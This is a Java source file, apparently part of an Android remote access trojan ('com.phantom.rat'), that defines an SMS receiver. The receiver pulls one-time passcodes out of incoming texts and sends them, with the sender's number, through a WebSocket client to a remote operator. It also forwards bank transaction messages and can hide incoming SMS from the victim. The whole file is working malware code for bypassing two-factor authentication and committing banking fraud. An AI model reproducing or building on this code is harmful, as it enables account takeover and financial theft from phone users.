package com.phantom.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsMonitor extends BroadcastReceiver {
    private static volatile boolean block = false;
    private static volatile String lastOtp = "";
    private static final Pattern OTP_KEY = Pattern.compile(
            "(?i)(otp|one[- ]?time|verification|passcode|security code|login code|verify|pin)\\b[^\\d]{0,20}(\\d{4,8})");
    private static final Pattern TX_KEY = Pattern.compile(
            "(?i)(credited|debited|transfer|payment|purchase|withdraw|deposit|balance|spent)");

    public static void setBlock(boolean b) { block = b; }

    public static String latestOtp(Context ctx) { return lastOtp; }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;
        if (block) {
            try { abortBroadcast(); } catch (Exception ignored) {}
        }
        try {
            for (android.telephony.SmsMessage sms : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String body = sms == null ? null : sms.getMessageBody();
                String from = sms == null ? null : sms.getOriginatingAddress();
                if (body == null) continue;
                checkOtp(context, from == null ? "sms" : from, body);
                checkTx(context, from == null ? "sms" : from, body);
            }
        } catch (Exception ignored) {}
    }

    private void checkOtp(Context ctx, String from, String body) {
        Matcher m = OTP_KEY.matcher(body);
        if (m.find()) {
            String code = m.group(2);
            lastOtp = code;
            WebSocketClient w = WebSocketClient.getInstance();
            if (w != null) w.sendOtp(from, code);
        }
    }

    private void checkTx(Context ctx, String from, String body) {
        if (TX_KEY.matcher(body).find()) {
            WebSocketClient w = WebSocketClient.getInstance();
            if (w != null) w.sendLog("tx", from + ": " + truncate(body));
        }
    }

    private static String truncate(String s) {
        return s.length() > 300 ? s.substring(0, 300) : s;
    }
}
